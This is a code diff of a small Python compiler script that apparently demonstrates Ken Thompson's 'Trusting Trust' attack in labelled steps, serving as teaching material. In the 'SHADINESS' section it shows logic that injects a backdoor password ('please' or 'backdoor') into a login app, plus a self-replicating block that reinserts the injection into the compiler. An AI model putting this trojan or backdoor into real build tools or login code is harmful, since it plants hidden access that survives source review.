@@ -17,39 +17,41 @@ def build( inPath, outPath ):
 
             # START SHADINESS
 
-            # The obviously malicious code we're inspired to hide (step 1)
+            # STEP 2
+            # The obviously malicious code we're inspired to hide
+            # Not necessary to achieve final result
             #if 'password ==' in line and 'login_app.py' == inPath:
-            #    line = app_line
+            #    line = '    if password == \'please\' or password == \'backdoor\':\n'
 
-            # Uncomment this block and recompile for step 2 of Trusting Trust
-            app_cond = 'if \'password ==\' in line and \'login_app.py\' == inPath:'
-            app_line = 'line = \'if password == \\\'please\\\' or password == \\\'backdoor\\\':\''
-            comp_cond = 'if \'for line in f.readlines\' in line and \'thisword\' not in line:'
-            comp_line = r'''
-            app_cond = "%s"
-            app_line = "%s"
-            comp_cond = "%s"
-            comp_line = "%%s" %% REPLACE
-            %s
-                %s
-                source += line
-                continue
-            %s
-                cl = comp_line%( app_cond, app_line, comp_cond, app_cond,
-                                 app_line, comp_cond )
-                line += cl.replace( 'REPLACE', '\'\'\'+comp_line+'\'\'\'' ) '''
+            # STEP 3
+            # Include this block and recompile for next step of Trusting Trust
+            #comp_line = r'''
+            #comp_line = r"REPLACE"
 
-            if 'for line in f.readlines' in line and 'if' not in line:
-                cl = comp_line%( app_cond, app_line, comp_cond, app_cond,
-                                 app_line, comp_cond )
-                line += cl.replace( 'REPLACE', '\'\'\''+comp_line+'\'\'\'' )
+            #if \'password ==\' in line and \'login_app.py\' == inPath:
+            #    line = '    if password == \\'please\\' or password == \\'backdoor\\':\\n'
+            #    source += line
+            #    continue
+            #if \'for line in f.readlines\' in line and \'thisword\' not in line:
+            #    comp_str = bytes( comp_line, 'utf-8' ).decode( 'unicode_escape' )
+            #    line += comp_str.replace( '"REPLACE"', '"""'+repr( comp_line )+'"""', 1 )
+            #    source += line
+            #    continue
 
-            # Step 3, delete (comment out) all the malicious code
+            #'''
+
+            #if 'for line in f.readlines' in line and 'thisword' not in line:
+            #    comp_str = bytes( comp_line, 'utf-8' ).decode( 'unicode_escape' )
+            #    line += comp_str.replace( '"REPLACE"', '"""'+comp_line+'"""', 1 )
+            #    source += line
+            #    continue
+
+            # STEP 4
+            # Disable all the malicious code, recompile, bug persists.
 
             # END SHADINESS
 
             source += line
-    print( source )
     co = compile( source, inPath, 'exec' )
     with open( outPath, 'wb' ) as f:
         marshal.dump( co, f )
